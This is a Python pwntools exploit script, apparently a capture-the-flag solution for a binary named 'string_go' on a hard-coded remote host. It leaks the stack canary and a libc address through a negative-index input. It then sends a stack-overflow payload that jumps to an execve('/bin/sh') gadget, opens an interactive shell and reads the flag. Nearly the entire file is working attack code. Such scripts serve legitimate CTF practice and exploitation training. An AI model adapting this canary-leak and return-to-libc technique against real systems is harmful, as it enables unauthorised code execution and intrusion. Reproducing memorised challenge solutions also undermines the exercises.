from pwn import *
import sys

local       = 0
binary      = "./string_go"
local_libc  = "/lib/x86_64-linux-gnu/libc.so.6"
ip          = "82.157.20.104"
port        = 32000
remote_libc = "./libc-2.27.so"


def main(ip=ip,port=port):
    global p,elf,libc
    elf = ELF(binary)
    if local:
        context.log_level   = "debug"
        p=process(binary)
        # p=process(binary,env={'LD_PRELOAD':'./libc-2.23.so'})
        libc = ELF(local_libc)
        pwn()
    else:
        context.log_level   = "debug"
        p=remote(ip,port)
        libc=ELF(remote_libc)
        pwn()

def pwn():
    p.sendlineafter(">>> ",str(3))
    #v7
    p.sendlineafter(">>> ",str(-1))
    #v10
    debug(p,'''b *$rebase(0x22ff)
        b *$rebase(0x23a4)
        b *$rebase(0x236a)
        b *$rebase(0x2415)
        b *$rebase(0x23b7)''')
    p.sendlineafter(">>> ","skyeskye"*2)
    #v2
    p.sendlineafter(">>> ",'b')
    p.recv(0x38)
    cannary = u64(p.recv(8))
    print "cannary:",hex(cannary)
    p.recv(0xb8)
    leak_addr = u64(p.recv(6).ljust(8,'\x00'))-231
    print "leak_addr:",hex(leak_addr)
    libc_addr = leak_addr - libc.sym['__libc_start_main']
    print "libc_addr:",hex(libc_addr)

    '''
    0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      rsp & 0xf == 0
      rcx == NULL

    0x4f432 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      [rsp+0x40] == NULL

    0x10a41c execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    '''
    '''
    0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      rsp & 0xf == 0
      rcx == NULL

    0x4f432 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      [rsp+0x40] == NULL

    0x10a41c execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    '''

    payload = 'a'*0x18+p64(cannary)+'a'*0x18
    payload += p64(libc_addr+0x4f3d5)
    p.sendline(payload)



    p.interactive()

def cat_flag():
    global flag
    p.recv()
    p.sendline("cat flag")
    flag = p.recvuntil('\n',drop=True).strip()
    
def debug(p,content=''):
    if local:
        gdb.attach(p,content)
        raw_input()

if __name__ == "__main__":
    if(len(sys.argv)==3):
        ip      = sys.argv[1]
        port    = sys.argv[2]
    main()
